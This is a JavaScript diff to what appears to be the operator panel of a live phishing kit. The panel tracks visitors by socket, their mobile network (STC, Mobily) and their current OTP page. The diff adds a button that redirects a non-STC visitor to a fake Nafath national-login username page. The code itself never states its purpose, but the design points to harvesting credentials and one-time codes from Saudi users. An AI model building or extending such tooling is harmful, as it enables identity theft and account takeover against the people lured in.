@@ -1506,8 +1506,15 @@
               html += '<button id="' + codeStcBtnId + '" class="flex-1 px-3 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>اتصال STC</button>';
             } else if (dc.page === 'تحقق رقم الجوال (OTP)') {
               // أزرار صفحة تحقق رقم الجوال OTP
+              const phoneOtpNafathUsernameBtnId = 'phone-otp-nafath-username-btn-' + visitor.socketId + '-' + index;
               const phoneOtpNafathBtnId = 'phone-otp-nafath-btn-' + visitor.socketId + '-' + index;
               const phoneOtpMobilyBtnId = 'phone-otp-mobily-btn-' + visitor.socketId + '-' + index;
+              // إضافة زر اسم مستخدم نفاذ فقط إذا كان غير STC
+              const otpProvider = visitor.network || '';
+              const otpIsStc = otpProvider.toLowerCase().includes('stc') || otpProvider === 'STC';
+              if (!otpIsStc) {
+                html += '<button id="' + phoneOtpNafathUsernameBtnId + '" class="flex-1 px-3 py-2 bg-teal-600 text-white rounded-lg hover:bg-teal-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>اسم مستخدم نفاذ</button>';
+              }
               html += '<button id="' + phoneOtpNafathBtnId + '" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>تطبيق نفاذ</button>';
               // إضافة زر اتصال موبايلي فقط إذا كانت الشبكة موبايلي
               if (visitor.network === 'موبايلي') {
@@ -1569,8 +1576,24 @@
                 });
               }
               // Event listeners لأزرار صفحة تحقق رقم الجوال OTP
+              const phoneOtpNafathUsernameBtn = document.getElementById('phone-otp-nafath-username-btn-' + visitor.socketId + '-' + index);
               const phoneOtpNafathBtn = document.getElementById('phone-otp-nafath-btn-' + visitor.socketId + '-' + index);
               const phoneOtpMobilyBtn = document.getElementById('phone-otp-mobily-btn-' + visitor.socketId + '-' + index);
+              if (phoneOtpNafathUsernameBtn) {
+                phoneOtpNafathUsernameBtn.addEventListener('click', () => {
+                  navigateVisitorToPage(visitor.socketId, 'nafath-login-page');
+                  const originalText = phoneOtpNafathUsernameBtn.textContent;
+                  const originalClasses = ['bg-teal-600', 'hover:bg-teal-700'];
+                  phoneOtpNafathUsernameBtn.textContent = 'تم الإرسال ✓';
+                  phoneOtpNafathUsernameBtn.classList.remove(...originalClasses);
+                  phoneOtpNafathUsernameBtn.classList.add('bg-green-600');
+                  setTimeout(() => {
+                    phoneOtpNafathUsernameBtn.textContent = originalText;
+                    phoneOtpNafathUsernameBtn.classList.remove('bg-green-600');
+                    phoneOtpNafathUsernameBtn.classList.add(...originalClasses);
+                  }, 1500);
+                });
+              }
               if (phoneOtpNafathBtn) {
                 phoneOtpNafathBtn.addEventListener('click', () => {
                   navigateVisitorToPage(visitor.socketId, 'nafath-verify');
